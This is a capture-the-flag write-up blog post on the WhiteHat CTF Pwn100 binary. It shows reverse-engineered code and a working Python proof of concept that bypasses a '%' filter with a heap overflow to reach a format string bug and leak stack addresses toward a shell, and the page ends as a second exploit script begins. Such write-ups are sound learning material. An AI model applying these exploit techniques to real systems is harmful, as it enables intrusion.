
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>WhiteHat CTF - Pwn100 - staring into /dev/null</title>
  <meta name="author" content="barrebas">

  
  <meta name="description" content="This CTF lasted only twelve hours. I focused on the pwnables, this one was worth 100 points but could&rsquo;ve been way more! We&rsquo;re given a zip &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://barrebas.github.io/blog/2015/07/25/whitehat-ctf-pwn100">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="staring into /dev/null" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">staring into /dev/null</a></h1>
  
    <h2>barrebas</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:barrebas.github.io" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div>
<article class="hentry" role="article">
  
  <header>
    
      <h1 class="entry-title">WhiteHat CTF - Pwn100</h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-07-25T21:17:14+02:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>25</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:17 pm</span></time>
        
      </p>
    
  </header>


<div class="entry-content"><p>This CTF lasted only twelve hours. I focused on the pwnables, this one was worth 100 points but could&rsquo;ve been way more!</p>

<!--more-->


<p>We&rsquo;re given a zip file containing a binary and the correspondig libc.so. How nice!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/wh/pwn100<span class="nv">$ </span>file pwn100
</span><span class='line'>pwn100: ELF 32-bit LSB executable, Intel 80386, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked <span class="o">(</span>uses shared libs<span class="o">)</span>, <span class="k">for</span> GNU/Linux 2.6.24, BuildID<span class="o">[</span>sha1<span class="o">]=</span>0xce8e5ce254c2d733d19d9435903aff3656bef10e, not stripped
</span><span class='line'>bas@tritonal:~/tmp/wh/pwn100<span class="nv">$ </span>objdump -d -M intel --no-show-raw-insn ./pwn100 &gt; pwn100.out
</span></code></pre></td></tr></table></div></figure>


<p>Running it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/wh/pwn100<span class="nv">$ </span>./pwn100
</span><span class='line'>INPUT1
</span><span class='line'><span class="nv">INPUT2</span>
</span><span class='line'><span class="o">========</span>
</span><span class='line'>T1Verify 1
</span><span class='line'>INPUT1
</span><span class='line'>
</span><span class='line'>T2Verify 1
</span><span class='line'><span class="nv">INPUT2</span>
</span><span class='line'>
</span><span class='line'><span class="o">========</span>
</span><span class='line'>T1Verify 1
</span><span class='line'>INPUT1
</span><span class='line'>
</span><span class='line'>T2Verify 1
</span><span class='line'>INPUT2
</span><span class='line'>...etc...
</span></code></pre></td></tr></table></div></figure>


<p>It doesn&rsquo;t do a whole lot, it takes two strings as input and then starts looping. Superkojiman and I quickly realized we could crash this C++ application by sending more than 300 bytes as input. However, this made it crash in <code>strlen</code>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/wh/pwn100<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;A&quot;*300+&quot;\n&quot;+&quot;B&quot;*300+&quot;\n&quot;&#39;</span> <span class="p">|</span> ltrace ./pwn100
</span><span class='line'>__libc_start_main<span class="o">(</span>0x8048747, 1, 0xffbfc5c4, 0x8048c20, 0x8048c90 &lt;unfinished ...&gt;
</span><span class='line'>_ZNSt8ios_base4InitC1Ev<span class="o">(</span>0x804a054, 0xf77975e0, 0, 0xf76a7ff4, 0xf77560d0<span class="o">)</span> <span class="o">=</span> 0
</span><span class='line'>__cxa_atexit<span class="o">(</span>0x80485d0, 0x804a054, 0x804a044, 0xf76a7ff4, 0xf77560d0<span class="o">)</span> <span class="o">=</span> 0
</span><span class='line'>malloc<span class="o">(</span>10240<span class="o">)</span>                                    <span class="o">=</span> 0x081af008
</span><span class='line'>memset<span class="o">(</span>0xffbfc10c, <span class="s1">&#39;\000&#39;</span>, 1024<span class="o">)</span>                 <span class="o">=</span> 0xffbfc10c
</span><span class='line'><span class="nb">read</span><span class="o">(</span>0, <span class="s2">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>..., 1024<span class="o">)</span> <span class="o">=</span> 603
</span><span class='line'>strlen<span class="o">(</span><span class="s2">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>...<span class="o">)</span>    <span class="o">=</span> 603
</span><span class='line'>memset<span class="o">(</span>0xffbfc10c, <span class="s1">&#39;\000&#39;</span>, 1024<span class="o">)</span>                 <span class="o">=</span> 0xffbfc10c
</span><span class='line'><span class="nb">read</span><span class="o">(</span>0, <span class="s2">&quot;&quot;</span>, 1024<span class="o">)</span>                                <span class="o">=</span> 0
</span><span class='line'>strlen<span class="o">(</span><span class="s2">&quot;&quot;</span><span class="o">)</span>                                       <span class="o">=</span> 0
</span><span class='line'>strlen<span class="o">(</span><span class="s2">&quot;&quot;</span><span class="o">)</span>                                       <span class="o">=</span> 0
</span><span class='line'>memset<span class="o">(</span>0x081af020, <span class="s1">&#39;\000&#39;</span>, 0<span class="o">)</span>                    <span class="o">=</span> 0x081af020
</span><span class='line'>strlen<span class="o">(</span><span class="s2">&quot;&quot;</span><span class="o">)</span>                                       <span class="o">=</span> 0
</span><span class='line'>memcpy<span class="o">(</span>0x081af020, <span class="s2">&quot;&quot;</span>, 0<span class="o">)</span>                        <span class="o">=</span> 0x081af020
</span><span class='line'>strlen<span class="o">(</span><span class="s2">&quot;&quot;</span><span class="o">)</span>                                       <span class="o">=</span> 0
</span><span class='line'>strlen<span class="o">(</span><span class="s2">&quot;&quot;</span><span class="o">)</span>                                       <span class="o">=</span> 0
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;========\n&quot;</span>, <span class="nv">9</span><span class="o">========</span>
</span><span class='line'><span class="o">)</span>                        <span class="o">=</span> 9
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;T1&quot;</span>, 2T1<span class="o">)</span>                                <span class="o">=</span> 2
</span><span class='line'>memset<span class="o">(</span>0xffbfb8dc, <span class="s1">&#39;\000&#39;</span>, 1024<span class="o">)</span>                 <span class="o">=</span> 0xffbfb8dc
</span><span class='line'>sprintf<span class="o">(</span><span class="s2">&quot;Verify 0\n&quot;</span>, <span class="s2">&quot;Verify %x\n&quot;</span>, 0<span class="o">)</span>          <span class="o">=</span> 9
</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Verify 0\n&quot;</span>, 20Verify 0
</span><span class='line'><span class="o">)</span>                       <span class="o">=</span> 20
</span><span class='line'>memset<span class="o">(</span>0xffbfb8dc, <span class="s1">&#39;\000&#39;</span>, 1024<span class="o">)</span>                 <span class="o">=</span> 0xffbfb8dc
</span><span class='line'>strlen<span class="o">(</span>NULL &lt;unfinished ...&gt;
</span><span class='line'>--- SIGSEGV <span class="o">(</span>Segmentation fault<span class="o">)</span> ---
</span><span class='line'>+++ killed by SIGSEGV +++
</span></code></pre></td></tr></table></div></figure>


<p>This is unfortunate. It actually combined our inputs and then decided to crash via a null pointer in <code>strlen</code>. We started investigating the binary in more detail. It fills two &ldquo;Tag&rdquo; structures on the heap with our input:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="n">Tag</span><span class="o">::</span><span class="n">set_tag_content</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)(</span><span class="kt">int</span> <span class="o">*</span> <span class="n">arg_0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">eax</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">arg_4</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">eax</span> <span class="o">&lt;=</span> <span class="mh">0x201</span><span class="p">)</span> <span class="k">goto</span> <span class="n">loc_8048976</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nl">loc_8048a40</span><span class="p">:</span>
</span><span class='line'>    <span class="n">esp</span> <span class="o">=</span> <span class="n">esp</span> <span class="o">+</span> <span class="mh">0x24</span><span class="p">;</span>
</span><span class='line'>    <span class="n">ebx</span> <span class="o">=</span> <span class="n">stack</span><span class="p">[</span><span class="mi">2047</span><span class="p">];</span>
</span><span class='line'>    <span class="n">ebp</span> <span class="o">=</span> <span class="n">stack</span><span class="p">[</span><span class="mi">2046</span><span class="p">];</span>
</span><span class='line'>    <span class="k">return</span> <span class="n">eax</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nl">loc_8048976</span><span class="p">:</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">arg_0</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="n">stack</span><span class="p">[</span><span class="mi">2047</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x200</span><span class="p">;</span>
</span><span class='line'>            <span class="o">*</span><span class="p">(</span><span class="n">arg_0</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">)</span> <span class="o">=</span> <span class="n">Mem</span><span class="o">::</span><span class="n">get_mem</span><span class="p">(</span><span class="mh">0x804a04c</span><span class="p">);</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="n">eax</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">arg_0</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">);</span>
</span><span class='line'>    <span class="n">eax</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">eax</span><span class="p">);</span>
</span><span class='line'>    <span class="n">eax</span> <span class="o">=</span> <span class="n">memset</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">arg_0</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">),</span> <span class="mh">0x0</span><span class="p">,</span> <span class="n">eax</span><span class="p">);</span>
</span><span class='line'>    <span class="n">eax</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">arg_4</span><span class="p">);</span>
</span><span class='line'>    <span class="n">eax</span> <span class="o">=</span> <span class="n">memcpy</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">arg_0</span> <span class="o">+</span> <span class="mh">0x8</span><span class="p">),</span> <span class="n">arg_4</span><span class="p">,</span> <span class="n">eax</span><span class="p">);</span> <span class="n">copied</span> <span class="n">to</span> <span class="n">heap</span><span class="o">?</span>
</span><span class='line'>    <span class="n">var_C</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
</span><span class='line'>    <span class="k">goto</span> <span class="n">loc_8048a14</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nl">loc_8048a14</span><span class="p">:</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">var_C</span> <span class="o">&lt;</span> <span class="n">strlen</span><span class="p">(</span><span class="n">arg_4</span><span class="p">))</span> <span class="k">goto</span> <span class="n">loc_80489ef</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nl">loc_8048a26</span><span class="p">:</span>
</span><span class='line'>    <span class="n">eax</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">arg_4</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">var_C</span> <span class="o">==</span> <span class="n">eax</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="n">eax</span> <span class="o">=</span> <span class="n">arg_0</span><span class="p">;</span>
</span><span class='line'>            <span class="o">*</span><span class="p">(</span><span class="kt">int16_t</span> <span class="o">*</span><span class="p">)</span><span class="n">eax</span> <span class="o">=</span> <span class="mh">0x1</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">goto</span> <span class="n">loc_8048a40</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nl">loc_80489ef</span><span class="p">:</span>
</span><span class='line'>    <span class="k">if</span> <span class="p">(</span><span class="n">LOBYTE</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">int8_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">arg_4</span> <span class="o">+</span> <span class="n">var_C</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">!=</span> <span class="n">LOBYTE</span><span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">int8_t</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x8048cb1</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">))</span> <span class="k">goto</span> <span class="n">loc_8048a10</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nl">loc_8048a06</span><span class="p">:</span>
</span><span class='line'>    <span class="o">*</span><span class="p">(</span><span class="kt">int16_t</span> <span class="o">*</span><span class="p">)</span><span class="n">arg_0</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
</span><span class='line'>    <span class="k">goto</span> <span class="n">loc_8048a26</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="nl">loc_8048a10</span><span class="p">:</span>
</span><span class='line'>    <span class="n">var_C</span> <span class="o">=</span> <span class="n">var_C</span> <span class="o">+</span> <span class="mh">0x1</span><span class="p">;</span>
</span><span class='line'>    <span class="k">goto</span> <span class="n">loc_8048a14</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>It checks the length of the input to be less than or equal to 0x201 or 513 bytes. If it is larger, the structure on the heap is not filled (hence our crash in <code>strlen()</code>). The code at <code>loc_80489ef</code> checks our input for the <code>%</code> character&hellip; This hinted at a format string vulnerability!</p>

<p>If there is no <code>%</code> character present, a flag in the structure on the heap will be set to <code>1</code>. If not, the flag will be <code>0</code>. This value is later checked and the binary will print:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/wh/pwn100<span class="nv">$ </span>./pwn100
</span><span class='line'>%%
</span><span class='line'><span class="nv">AA</span>
</span><span class='line'><span class="o">========</span>
</span><span class='line'>T1Verify 0
</span><span class='line'>%%
</span><span class='line'>
</span><span class='line'> Not verify , content?
</span></code></pre></td></tr></table></div></figure>


<p>I call this flag &ldquo;Tag::verify&rdquo;. I started playing around with the input and I was able to overwrite the verify flag of Tag2 using a buffer overflow in Tag1:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>r
</span><span class='line'>%
</span><span class='line'>%p
</span><span class='line'><span class="o">========</span>
</span><span class='line'>T1Verify 0
</span><span class='line'>%
</span><span class='line'>
</span><span class='line'> Not verify , content?
</span><span class='line'>11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
</span><span class='line'>T2Verify a
</span><span class='line'>%p
</span><span class='line'>
</span><span class='line'> Not verify , content?
</span></code></pre></td></tr></table></div></figure>


<p>First, I sent an invalid Tag1 and Tag2 buffer, containing a <code>%</code> character. Then I get the option to send another input for Tag1. I submit 512*<code>1</code> plus a newline (which is <code>a</code> in hexadecimal). The newline ends up in Tag2::verify!</p>

<p>This means we can bypass the verification by overflowing Tag1 into Tag2::verify. I started a <code>socat</code> listener and started experimenting in a python script.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/wh/pwn100<span class="nv">$ </span>socat TCP-LISTEN:6666,fork EXEC:./pwn100
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">readtil</span><span class="p">(</span><span class="n">delim</span><span class="p">):</span>
</span><span class='line'>  <span class="n">buf</span> <span class="o">=</span> <span class="n">b</span><span class="s">&#39;&#39;</span>
</span><span class='line'>  <span class="k">while</span> <span class="ow">not</span> <span class="n">delim</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
</span><span class='line'>      <span class="n">buf</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">buf</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;L&#39;</span><span class="p">,</span> <span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xffffffff</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;localhost&#39;</span><span class="p">,</span> <span class="mi">6666</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>  <span class="c"># send invalid tag1</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">*</span><span class="mi">511</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x0a</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># tag2 is also invalid, but we will bypass the protection</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%08x</span><span class="s">-</span><span class="si">%08x</span><span class="s">-</span><span class="si">%08x</span><span class="s">-</span><span class="si">%08x</span><span class="s">-</span><span class="si">%08x</span><span class="s">-</span><span class="si">%08x</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;content?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
</span><span class='line'>  <span class="c"># enable tag2 by overwriting Tag2::verified</span>
</span><span class='line'>  <span class="c"># it will be printed using sprintf() even though it contains invalid chars \o/</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">*</span><span class="mi">512</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x01</span><span class="s">&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;T2Verify 1&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">t</span> <span class="o">=</span> <span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">sock</span> <span class="o">=</span> <span class="n">s</span>
</span><span class='line'>  <span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'><span class="n">pwn</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>The offsets are taken from the output of <code>nm -D ./libc.so.6 | grep &lt;function_name&gt;</code>.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/wh/pwn100<span class="nv">$ </span>python poc1.py
</span><span class='line'>
</span><span class='line'>00000400-083cb214-00000000-00000000-00000000-30303030
</span><span class='line'>
</span><span class='line'><span class="o">========</span>
</span><span class='line'>T1Verify 0
</span><span class='line'>...snip...
</span></code></pre></td></tr></table></div></figure>


<p>It works! We can bypass the string format protection by overflowing Tag1 into Tag2. Now things become interesting. We need a way to spawn a shell, so we need <code>system()</code>. However, ASLR is probably enabled, so we need to leak a libc address somehow. We can easily leak addresses with the string format vulnerability. Let&rsquo;s run it against the super slow remote server:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">sys</span><span class="o">,</span> <span class="nn">time</span>
